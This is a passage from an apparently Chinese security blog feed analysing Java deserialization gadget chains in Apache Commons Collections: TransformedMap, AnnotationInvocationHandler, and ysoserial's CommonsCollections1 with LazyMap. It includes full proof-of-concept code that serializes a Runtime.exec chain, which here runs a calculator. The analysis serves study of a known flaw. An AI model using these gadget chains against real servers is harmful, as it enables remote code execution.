     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后通过<code>setValue()</code>方法调用了<code>checkSetValue()</code>方法，从而造成命令执行<br><img src="images/image-20220913180841818.png" alt="image-20220913180841818"></p><p><img src="images/image-20220913180501737.png" alt="image-20220913180501737"></p><p>模拟成现实情况（客户端发送请求-服务端处理请求）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TransformerTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerTest</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 客户端</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(transformedMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 服务端</span></span><br><span class="line"><span class="comment">    *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">      <span class="comment">// 通过readObject方法进行反序列化</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) in.readObject();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220913183349120.png" alt="image-20220913183349120"></p><p>相比之前触发反序列化的方式更为容易，当开发者将反序列化的对象转换成<code>Map</code>类型之后，通过<code>put()</code>、<code>putAll()</code>或者<code>setValue()</code>对<code>map</code>进行操作即可完成命令执行。</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>前面的利用链仍需要服务端进行反序列化转换成<code>Map</code>对象，并进行赋值或者修改操作才可以触发命令执行。为了使得我们的攻击<code>payload</code>在服务端仅经过反序列化就可以触发，需要寻找新的利用点：<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>接下来我们看看<code>AnnotationInvocationHandler</code>类的源码，在构造函数中，传进的<code>Map</code>类型参数赋值给<code>memberValues</code><br><img src="images/image-20220914113429062.png" alt="image-20220914113429062"></p><p>在<code>readObject()</code>方法中，对<code>memberValues</code>进行遍历，最终当<code>var7</code>不为<code>null</code>时，通过<code>setValue()</code>进行修改操作，因此可以进入前面<code>TransformedMap</code>类中的<code>checkSetValue()</code>，触发命令执行<br><img src="images/image-20220914113611289.png" alt="image-20220914113611289"></p><p>POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TransformerTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerTest</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 客户端</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            <span class="comment">// 设置方法访问权限</span></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 创建含有攻击链的AnnotationInvocationHandler类实例</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">            <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            out.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 服务端</span></span><br><span class="line"><span class="comment">    *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220914115903758.png" alt="image-20220914115903758"></p><p>这里需要注意<code>map.put(&quot;value&quot;,&quot;value&quot;);</code>中的<code>key</code>必须为<code>value</code>。<strong>具体原因如下：</strong></p><p>在构造方法中我们传入的<code>Class</code>需要继承<code>Annotation</code>注解<br><img src="images/image-20221004170152670.png" alt="image-20221004170152670"></p><p>因此在 POC 里，我们构造攻击链的时候传入了 Java 标准库中的<code>Target.class</code>元注解<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建含有攻击链的AnnotationInvocationHandler类实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure></p><p>查看<code>@Target</code>元注解的源码，其中已经定义了参数元素为<code>value</code><br><img src="images/image-20221004170044091.png" alt="image-20221004170044091"></p><p>在<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法中，<code>var2 = AnnotationType.getInstance(this.type);</code>对<code>Target</code>元注解进行了处理，随后传到了<code>Map</code>类型参数<code>var3</code>中</p><p><img src="images/image-20220915000423127.png" alt="image-20220915000423127"></p><p>随后在<code>var6</code>中取得了我们前面设置的<code>map.put(&quot;value&quot;,&quot;value&quot;);</code>的<code>key</code>，也就是<code>value</code>，接着在<code>var7</code>中获得的类<code>java.lang.annotation.ElementType</code>不为空满足<code>if</code>条件进入循环。</p><p>由此可得知，如果我们传入的是<code>@Target</code>元注解，我们构造的条件要满足：<code>map.put(&quot;value&quot;,xxxx);</code>才能进入<code>if</code>条件里触发命令执行。</p><p><strong>该条攻击利用链的限制</strong></p><p>JDK 版本需要在 8u71 之前（本文 JDK 版本为 8u60），在此之后的版本都无法触发命令执行，原因是<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法进行了修改，不再直接使用反序列化得到的<code>Map</code>进行操作，而是新建了一个<code>LinkedHashMap</code>对象。</p><p>后续相关操作都基于<code>LinkedHashMap</code>对象，而我们构造的<code>map</code>不再执行<code>put()</code>或者<code>setValue()</code>，因此无法触发命令执行。</p>]]></content>
    
    
    <summary type="html">CommonsCollection利用链</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections1利用链分析</title>
    <link href="http://example.com/2022/11/10/CommonsCollections1/"/>
    <id>http://example.com/2022/11/10/CommonsCollections1/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:52:32.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections1利用链分析"><a href="#CommonsCollections1利用链分析" class="headerlink" title="CommonsCollections1利用链分析"></a>CommonsCollections1利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里开始学习分析<code>ysoserial</code>工具中的第一条<code>CommonsCollections</code>利用链，根据<code>payload</code>名称称呼为<code>CommonsCollections1</code><br><img src="images/image-20220919220735401.png" alt="image-20220919220735401"></p><p>利用版本：CommonsCollections 3.1 - 3.2.1<br>限制：jdk 8u71 版本之前</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>我们先看一下<code>ysoserial</code>实现<code>CommonsCollections1</code>的关键源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到前面部分和我们在<a href="./01-Java安全基础/5-Java反序列化/1-CommonsCollections.md">《CommonsCollections链分析》</a>中构造的一样，不一样的是不再利用<code>transformedMap</code>类去调用<code>transform()</code>方法，而是使用了<code>LazyMap</code>中的方法，同时使用到了动态代理的知识。</p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>这条链子既然选择使用<code>LazyMap</code>类，那必然是该类中也有调用<code>transform()</code>的方法，我们看一下<code>LazyMap</code>类的源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span 